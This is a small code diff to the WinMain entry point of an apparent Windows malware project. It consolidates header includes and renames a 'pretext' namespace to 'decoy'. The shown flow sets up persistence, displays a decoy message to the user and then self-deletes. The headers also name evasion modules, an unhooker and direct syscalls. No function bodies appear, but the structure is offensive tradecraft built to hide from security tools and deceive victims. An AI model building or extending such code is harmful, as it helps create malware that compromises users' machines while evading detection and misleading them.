@@ -2,14 +2,11 @@
 #include "persistence/Persistence.h"
 #include "evasion/Unhooker.h"
 #include "evasion/Syscalls.h"
-#include "decoy/Pretext.h"
+#include "decoy/Decoy.h"
 #include "utils/Cleanup.h"
 #include <windows.h>
 #include <objbase.h>
 #include "utils/Logger.h"
-#include "recon/Decoy.h"
-#include "utils/Cleanup.h"
-#include "utils/Pretext.h"
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
@@ -42,7 +39,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     } else {
         persistence::establishPersistence();
-        pretext::ShowInfoMessage();
+        decoy::ShowInfoMessage();
         cleanup::SelfDelete();
     }
 
